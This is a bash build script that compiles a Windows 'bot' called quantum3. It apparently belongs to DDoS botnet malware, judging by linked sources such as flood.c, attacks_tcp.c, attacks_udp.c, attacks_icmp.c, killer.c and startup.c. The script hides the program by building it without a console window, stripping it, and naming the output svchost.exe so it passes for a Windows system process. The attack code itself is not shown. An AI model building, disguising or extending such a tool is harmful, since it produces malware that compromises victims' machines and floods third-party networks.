#!/bin/bash
# Build quantum3 Windows bot (mingw-w64). Static, no console (GUI subsystem).
# Usage: ./build.sh [i686|x86_64]
set -e
ARCH="${1:-x86_64}"
case "$ARCH" in
  x86_64) TRIPLET=x86_64-w64-mingw32 ;;
  i686)   TRIPLET=i686-w64-mingw32 ;;
  *) echo "usage: $0 [x86_64|i686]"; exit 1 ;;
esac
CC="$TRIPLET-gcc"
OUT="svchost.exe"

$CC -O2 -s -o "$OUT" \
  -D_WIN32_WINNT=0x0600 \
  -static \
  main.c proto.c flood.c attacks_tcp.c attacks_udp.c attacks_icmp.c killer.c rand.c startup.c \
  crypto/chacha20.c crypto/fasthash.c crypto/teax.c \
  -lws2_32 -liphlpapi -luser32 -lshell32 \
  -Wl,--subsystem,windows \
  app.rc

echo "built $OUT ($ARCH)"
ls -la "$OUT"
